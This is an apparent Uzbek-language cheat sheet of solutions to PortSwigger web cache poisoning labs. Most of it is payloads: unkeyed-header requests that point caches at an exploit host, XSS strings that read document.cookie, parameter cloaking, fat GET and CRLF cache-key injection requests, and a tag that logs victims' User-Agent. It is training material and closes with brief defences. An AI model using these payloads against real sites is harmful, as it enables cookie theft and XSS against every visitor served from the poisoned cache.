# Web Cache Poisoning — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**, exploit server = **exploit.example.net**.
> Umumiy: unkeyed input (cache key'ga kirmaydigan header/param) topasan → zararli javobni
> cache'ga "poison" qilasan → victim o'sha cache'dan oladi. **Param Miner** (BApp) = asosiy tool.
> Cache buster (`?cb=1234`) bilan test qil, `X-Cache: hit` poison bo'lganini ko'rsatadi.

---

## Design flaws (unkeyed input)

### Unkeyed header (X-Forwarded-Host) — PRACTITIONER
`X-Forwarded-Host` `tracking.js` import URL'ini quradi.
```
X-Forwarded-Host: exploit.example.net
```
> Exploit server `/resources/js/tracking.js` da `alert(document.cookie)`.

### Unkeyed cookie — PRACTITIONER
`fehost` cookie JS obyektiga reflect bo'ladi.
```
fehost=someString"-alert(1)-"someString
```

### Multiple headers — PRACTITIONER
`X-Forwarded-Scheme` (nothttps → 302) + `X-Forwarded-Host` birga.
```
X-Forwarded-Host: exploit.example.net
X-Forwarded-Scheme: nothttps
```

### Targeted, unknown header (Param Miner) — PRACTITIONER
Param Miner "Guess headers" → `X-Host`. `Vary: User-Agent` bo'lsa victim UA'ni ol.
```
X-Host: exploit.example.net
```
> Victim UA olish uchun comment: `<img src="https://exploit.example.net/foo" />` → access log'dan UA.

### DOM vuln via strict cacheability — PRACTITIONER
`X-Forwarded-Host` `initGeoLocate()` ga host beradi, `geolocate.json` DOM XSS.
Exploit server `/resources/json/geolocate.json`, header `Access-Control-Allow-Origin: *`, body:
```json
{ "country": "<img src=1 onerror=alert(document.cookie) />" }
```
> Set-Cookie bo'lsa cache qilmaydi → session cookie'li so'rovdan foydalан.

### Combining vulnerabilities — EXPERT
`X-Forwarded-Host` (JSON import) + `X-Original-URL` (til majburlash). Exploit server
`/resources/json/translations.json` (ACAO:*), `es` tarjimasiga XSS:
```
"View details": "</a><img src=1 onerror='alert(document.cookie)' />"
```
```
GET /?localized=1   Cookie: lang=es   X-Forwarded-Host: exploit.example.net
GET /               X-Original-URL: /setlang\es
```
> `/setlang\es` → cacheable 302 → `/setlang/es` (backslash normalization).

---

## Implementation flaws (cache key parsing)

### Unkeyed query string — PRACTITIONER
Butun query string unkeyed. `Origin` header = cache buster.
```
GET /?evil='/><script>alert(1)</script>
```

### Unkeyed query parameter — PRACTITIONER
Faqat `utm_content` unkeyed.
```
GET /?utm_content='/><script>alert(1)</script>
```

### Parameter cloaking (`;`) — PRACTITIONER
Cache `utm_content` ni key'dan chiqaradi, backend `;` dan keyin 2-callback'ni o'qiydi.
```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

### Fat GET — PRACTITIONER
Cache key URL'dagi `callback`, backend BODY'dagi `callback`ni o'qiydi.
```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 17

callback=alert(1)
```

### URL normalization — PRACTITIONER
404 sahifa path'ni reflect qiladi; cache decode qiladi, browser encode qiladi → poison qilib
"Deliver link to victim".
```
GET /random</p><script>alert(1)</script><p>foo
```

### Cache key injection — EXPERT
Flawed regex `utm_content`ni key'dan chiqaradi; `Origin` orqali header injection.
```
GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$

GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
```
> `Pragma: x-get-cache-key` bilan cache key'ni ko'r. HTTP/2'da injected header lowercase.

### Internal cache poisoning — EXPERT
Ikki qatlam cache (external + internal). `X-Forwarded-Host` internal'da unkeyed, external'da keyed.
Param Miner cache-buster param → `geolocate.js` fragmentini poison.
```
X-Forwarded-Host: exploit.example.net
```
> Exploit server `/js/geolocate.js` da `alert(document.cookie)`.

---

### Eslatma
Qadam: unkeyed input topish (Param Miner) → reflect joyi → poison → `X-Cache: hit` → qayta poison.
Himoya: barcha ta'sir qiluvchi inputni cache key'ga kirit, `Vary` to'g'ri, user input'ni reflect qilma.
Umumiy: bu papka README.
